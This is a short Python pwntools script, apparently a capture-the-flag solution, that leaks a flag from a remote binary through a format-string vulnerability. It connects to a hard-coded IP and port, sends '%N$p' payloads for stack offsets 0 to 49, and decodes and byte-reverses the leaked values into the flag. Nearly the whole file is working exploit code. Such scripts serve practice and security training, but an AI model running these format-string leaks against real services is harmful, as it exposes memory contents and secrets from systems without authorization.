#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './print'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host = '20.205.238.7'
port = 10003


# =========================================================
#                           FUZZ
# =========================================================

flag = ''

for i in range(0, 50): # Range is obtained by fuzzing locally 
    try:
        # Connect to server
        io = remote(host, port)
        # Format the payload to location on stack
        io.sendlineafter(b'print', f'%{i}$p'.encode())
        # receive leaked
        leak = io.recvline()
        # ignore nulls
        if not b'(nil)' in leak:
            # print value if exist
            print(f'stack at-{i}' + ": " + str(leak))
            try:
                # unhex and decode leaked
                hexform = unhex(leak.split()[0][2:].decode())
                # append to flag and reverse endianess
                flag += hexform.decode()[::-1]
                # confirmation
                print("flag appended")
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print flag
print(f'{flag=}')
